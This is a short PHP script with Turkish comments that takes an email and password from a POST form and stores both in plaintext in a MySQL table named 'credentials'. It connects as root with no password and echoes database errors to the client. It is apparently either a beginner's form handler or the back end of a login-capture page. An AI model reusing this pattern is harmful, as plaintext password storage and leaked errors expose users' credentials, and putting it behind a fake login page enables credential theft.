<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // POST verilerini al
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Veritabanı bağlantısı
    $con = mysqli_connect("localhost", "root", "", "test");
    if (!$con) {
        die("Veritabanı bağlantısı başarısız: " . mysqli_connect_error());
    }

    // Veritabanına veri eklemek için SQL sorgusu
    $sql = "INSERT INTO credentials (email, password) VALUES (?, ?)";
    $stmt = mysqli_prepare($con, $sql);
    if ($stmt) {
        mysqli_stmt_bind_param($stmt, "ss", $email, $password);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
        echo "Insert successful";
    } else {
        echo "SQL hatası: " . mysqli_error($con);
    }

    // Veritabanı bağlantısını kapat
    mysqli_close($con);
}
?>
